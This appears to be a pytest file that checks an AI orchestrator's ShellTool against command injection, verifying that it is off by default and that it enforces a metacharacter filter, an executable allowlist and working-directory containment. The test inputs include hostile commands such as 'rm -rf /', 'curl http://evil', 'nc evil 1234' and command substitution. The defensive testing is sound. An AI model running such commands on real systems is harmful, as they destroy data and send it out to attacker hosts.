"""SEC-003 — ShellTool must not hand caller text to a host shell.

Before this policy `execute` passed ``params["command"]`` straight to
``asyncio.create_subprocess_shell`` with a caller-controlled ``cwd``. Anything
that could reach the tool — a prompt-injected model, a plugin, a remote
request — had arbitrary command execution as the process account.
"""

from __future__ import annotations

import pytest

from orchestrator.tools.shell_tool import ENABLED_ENV, ShellTool

pytestmark = pytest.mark.unit


@pytest.fixture
def enabled(monkeypatch):
    monkeypatch.setenv(ENABLED_ENV, "true")


class TestDisabledByDefault:
    @pytest.mark.asyncio
    async def test_disabled_without_optin(self, monkeypatch) -> None:
        monkeypatch.delenv(ENABLED_ENV, raising=False)
        result = await ShellTool().execute({"command": "echo hi"})
        assert result.success is False
        assert "disabled" in result.output.lower()

    @pytest.mark.asyncio
    async def test_empty_command_still_reports_no_command(self, monkeypatch) -> None:
        # Contract preserved from tests/test_agentic_system.py.
        monkeypatch.delenv(ENABLED_ENV, raising=False)
        result = await ShellTool().execute({})
        assert result.success is False
        assert "No command" in result.output


class TestShellMetacharactersRejected:
    @pytest.mark.parametrize(
        "cmd",
        [
            "echo hi; rm -rf /",
            "echo hi && curl http://evil",
            "echo `whoami`",
            "echo $(whoami)",
            "echo hi | nc evil 1234",
            "echo hi > /etc/passwd",
        ],
    )
    @pytest.mark.asyncio
    async def test_metacharacters_denied(self, enabled, cmd: str) -> None:
        result = await ShellTool().execute({"command": cmd})
        assert result.success is False
        assert result.metrics.get("denied_reason")


class TestExecutableAllowlist:
    @pytest.mark.parametrize("cmd", ["curl http://evil", "bash -c ls", "rm -rf .", "nc -l 1"])
    @pytest.mark.asyncio
    async def test_disallowed_executables_denied(self, enabled, cmd: str) -> None:
        result = await ShellTool().execute({"command": cmd})
        assert result.success is False
        assert result.metrics.get("denied_reason") == "executable_not_allowed"


class TestCwdContainment:
    @pytest.mark.asyncio
    async def test_cwd_escaping_workspace_denied(self, enabled, tmp_path, monkeypatch) -> None:
        monkeypatch.chdir(tmp_path)
        result = await ShellTool().execute({"command": "echo hi", "cwd": "../.."})
        assert result.success is False
        assert result.metrics.get("denied_reason") == "cwd_outside_workspace"


class TestAllowedCommandStillRuns:
    @pytest.mark.asyncio
    async def test_allowlisted_command_executes(self, enabled, tmp_path, monkeypatch) -> None:
        monkeypatch.chdir(tmp_path)
        result = await ShellTool().execute({"command": "python -c \"print('ok')\"", "timeout": 60})
        assert result.success is True, result.output
        assert "ok" in result.output

    @pytest.mark.asyncio
    async def test_argv_form_is_accepted(self, enabled, tmp_path, monkeypatch) -> None:
        monkeypatch.chdir(tmp_path)
        result = await ShellTool().execute(
            {"argv": ["python", "-c", "print('argv-ok')"], "timeout": 60}
        )
        assert result.success is True, result.output
        assert "argv-ok" in result.output


class TestValidateParams:
    def test_contract_preserved(self) -> None:
        assert ShellTool().validate_params({"command": "ls"}) is True
        assert ShellTool().validate_params({}) is False

    def test_argv_form_validates(self) -> None:
        assert ShellTool().validate_params({"argv": ["python", "-c", "pass"]}) is True
